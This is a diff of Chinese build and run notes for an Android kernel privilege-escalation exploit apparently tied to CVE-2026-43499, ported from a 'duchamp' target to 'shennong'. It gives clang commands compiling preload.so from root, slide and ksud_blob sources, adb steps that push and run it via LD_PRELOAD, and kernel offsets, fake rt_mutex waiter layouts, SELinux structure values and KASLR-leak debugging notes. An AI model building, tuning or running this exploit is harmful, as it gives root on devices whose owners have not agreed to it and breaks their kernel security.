@@ -1,24 +1,24 @@
-# duchamp-root 使用命令
+# shennong-root 使用命令
 
-项目根目录：`I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\duchamp-root`
+项目根目录：`I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root`
 
-## 1. 编译 preload.so（PROJECT=duchamp）
+## 1. 编译 preload.so（PROJECT=shennong）
 
-> 注意：duchamp 有专属 `src/targets/duchamp/slide.c`（legacy words 布局，shennong 6.1 专用），
+> 注意：shennong 有专属 `src/targets/shennong/slide.c`（legacy words 布局，shennong 6.1 专用），
 > 编译时**必须**用该路径替换 `src/slide.c`。
 
 ```powershell
-cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\duchamp-root"
+cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"
 $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"
-& $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/duchamp/target.h"' src/main.c src/util.c src/targets/duchamp/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/duchamp/bin/preload.so -pthread
+& $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/shennong/target.h"' src/main.c src/util.c src/targets/shennong/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/shennong/bin/preload.so -pthread
 ```
 
-产物：`build/duchamp/bin/preload.so`
+产物：`build/shennong/bin/preload.so`
 
 ## 2. 编译其他 target（如 blazer）
 
 ```powershell
-cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\duchamp-root"
+cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"
 $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"
 & $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/blazer-CP2A.260605.012/target.h"' src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/blazer-CP2A.260605.012/bin/preload.so -pthread
 ```
@@ -26,16 +26,16 @@ $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\too
 ## 3. 推送并运行
 
 ```powershell
-adb push build/duchamp/bin/preload.so /data/local/tmp/preload.so
+adb push build/shennong/bin/preload.so /data/local/tmp/preload.so
 adb shell 'chmod 0644 /data/local/tmp/preload.so'
 adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
 ```
 
 ## 4. 已验证的 shennong 修复点（2026-08-21）
 
-- `src/targets/duchamp/target.h`：FAKE_WAITER_* 为 6.4+ 布局（与 blazer 标准一致）；ASHMEM_*/CONFIGFS_*/COPY_SPLICE_READ/NOOP_LLSEEK/SELINUX_BLOB_SIZES/SECURITY_HOOK_HEADS/KMALLOC_CACHES 已更新为 shennong kallsyms 值
+- `src/targets/shennong/target.h`：FAKE_WAITER_* 为 6.4+ 布局（与 blazer 标准一致）；ASHMEM_*/CONFIGFS_*/COPY_SPLICE_READ/NOOP_LLSEEK/SELINUX_BLOB_SIZES/SECURITY_HOOK_HEADS/KMALLOC_CACHES 已更新为 shennong kallsyms 值
 - `src/common.h`：MM_STRUCT_SZ = 0x3c0（shennong sizeof(mm_struct)）
-- **新增 `src/targets/duchamp/slide.c`**：pselect words 改为 6.1 legacy 布局（tree@0x00/pi_tree@0x18/task@0x30/lock@0x38/wake+prio@0x40/0x44/deadline@0x48/ww_ctx@0x50），修复 shennong 6.1 legacy 内核下栈上 fake waiter 错位导致的 slide child panic
+- **新增 `src/targets/shennong/slide.c`**：pselect words 改为 6.1 legacy 布局（tree@0x00/pi_tree@0x18/task@0x30/lock@0x38/wake+prio@0x40/0x44/deadline@0x48/ww_ctx@0x50），修复 shennong 6.1 legacy 内核下栈上 fake waiter 错位导致的 slide child panic
 - 其他 target（blazer 等）仍用共享 `src/slide.c`（6.4+ words），不受影响
 - 若仍崩在 slide child：用 `dmesg -w` 抓内核 panic 栈定位
 
@@ -53,7 +53,7 @@ adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
 - **待排查方向**：
   1. waiter 在 pselect 时是否仍挂在 pi_target 树（FUTEX_WAIT_REQUEUE_PI 返回 EAGAIN 后 cleanup 可能已移除 waiter，导致后续 PI 重算不涉及它）
   2. consumer 的 `sched_setattr(SCHED_BATCH+nice)` 对非 RT 任务不触发 rt_mutex PI 传播，可能不是触发写入的机制
-  3. duchamp slide.c 相对参考版（CVE-2026-43499-Poc-Analysis/source/src/slide.c）的改动：固定 nice=19 vs 动态(calls%19)+1、legacy 11-word vs 6.4+ 13-word、consumer 去掉 tgkill 存活检查
+  3. shennong slide.c 相对参考版（CVE-2026-43499-Poc-Analysis/source/src/slide.c）的改动：固定 nice=19 vs 动态(calls%19)+1、legacy 11-word vs 6.4+ 13-word、consumer 去掉 tgkill 存活检查
 - **设备限制**：无 root，/proc/kallsyms 与 /sys/kernel/btf/vmlinux 不可读，无法用 generate_target.py 算法；/proc/config.gz 可读
 - 其他 SLIDE_* 偏移经 IDA 核对正确：NFULNL_LOGGER@0x01fe29c8、RANDOM_BOOT_ID_DATA@0x02107448（指向 sysctl_bootid 的 .data 槽，entry mode=0o444）、SYSCTL_BOOTID@0x0224a458
 
@@ -124,14 +124,14 @@ adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
 slide 的 pselect 路由在 6.1 上需重新设计触发路径让 waiter 进入 v17==4（rt_mutex_wait_proxy_lock）分支，而非当前 v17==1（IGNORE/EAGAIN）。这不是改偏移/参数能解决，属机制层重新设计。或换其他 KASLR 泄露原语。
 
 ### 实验性代码改动（已编译验证，证实均非根因，保留供参考）
-- `src/util.c` + `src/targets/duchamp/util.c`：加 `sched_setattr_tid_rt`（SCHED_FIFO+priority）
+- `src/util.c` + `src/targets/shennong/util.c`：加 `sched_setattr_tid_rt`（SCHED_FIFO+priority）
 - `src/common.h`：声明 `sched_setattr_tid_rt`
-- `src/targets/duchamp/slide.c`：consumer 改用 rt50（EPERM 时 fallback nice=19）
-- `src/targets/duchamp/target.h`：`SLIDE_LOGGERS_0_1_OFF` 0x01fe2918→0x01fe2920（ULOG 槽），BUILD 标签→shennong 307
+- `src/targets/shennong/slide.c`：consumer 改用 rt50（EPERM 时 fallback nice=19）
+- `src/targets/shennong/target.h`：`SLIDE_LOGGERS_0_1_OFF` 0x01fe2918→0x01fe2920（ULOG 槽），BUILD 标签→shennong 307
 
 
 
-cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\duchamp-root"; $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"; & $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/duchamp/target.h"' src/main.c src/util.c src/targets/duchamp/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/duchamp/bin/preload.so -pthread 2>&1 | Select-Object -First 40; if (Test-Path build/duchamp/bin/preload.so) { Get-FileHash build/duchamp/bin/preload.so -Algorithm SHA256 | Format-List; Get-Item build/duchamp/bin/preload.so | Select-Object Length, LastWriteTime }
+cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"; $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"; & $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/shennong/target.h"' src/main.c src/util.c src/targets/shennong/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/shennong/bin/preload.so -pthread 2>&1 | Select-Object -First 40; if (Test-Path build/shennong/bin/preload.so) { Get-FileHash build/shennong/bin/preload.so -Algorithm SHA256 | Format-List; Get-Item build/shennong/bin/preload.so | Select-Object Length, LastWriteTime }
 
 
 https://github.com/1ndevelopment/CVE-2026-43499-S26
